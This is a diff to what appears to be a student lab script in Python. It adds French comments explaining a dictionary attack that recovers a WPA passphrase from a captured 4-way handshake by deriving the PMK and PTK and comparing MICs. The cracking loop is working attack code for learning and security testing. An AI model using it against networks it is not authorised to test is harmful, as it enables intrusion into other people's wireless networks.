@@ -35,12 +35,18 @@ wpa=rdpcap("wpa_handshake.cap")
 
 # Important parameters for key derivation
 A           = "Pairwise key expansion" #this string is used in the pseudo-random function
+
+# On récupère le ssid à partir du paquet 3
 ssid = wpa[3].info.decode()
+# On récupère le MAC de l'AP à partir du paquet 1
 APmac = a2b_hex(wpa[1].addr1.replace(':', ''))
+# On récupère le MAC du client à partir du paquet 1
 Clientmac = a2b_hex(wpa[1].addr3.replace(':', ''))
 
 # Authenticator and Supplicant Nonces
+# On récupère le authenticator nonce à partir du paquet 5 (1e paquet du 4way handshake)
 ANonce = wpa[5].load[13:45]
+# On récupère le supplicant nonce à partir du paquet 6 (2e paquet du 4way handshake)
 SNonce = Dot11Elt(wpa[6]).load[65:97]
 
 # This is the MIC contained in the 4th frame of the 4-way handshake
@@ -51,6 +57,7 @@ data = a2b_hex(Dot11Elt(wpa[8]).load[48:].hex().replace(mic_to_test, "0"*len(mic
 
 ssid = str.encode(ssid)
 
+# On ouvre et lit le fichier wordlist susceptible de contenir la bonne passphrase
 f = open("wordlist.txt")
 lines = f.readlines()
 
@@ -61,7 +68,8 @@ for line in lines:
 
     #calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
     passPhrase  = str.encode(line)
-
+    
+    # Calcul de pmk avec pbkdf2
     pmk = pbkdf2(hashlib.sha1,passPhrase, ssid, 4096, 32)
 
     #expand pmk to obtain PTK
@@ -70,6 +78,7 @@ for line in lines:
     #calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
     mic = hmac.new(ptk[0:16],data,hashlib.sha1)
 
+    # On compare le MIC obtenu avec la passphrase potentielle avec le MIC contenu dans le 4e paquet du 4-way handshake
     if mic.hexdigest()[:-8] == mic_to_test:
 
         print("Correct passphrase:", passPhrase)
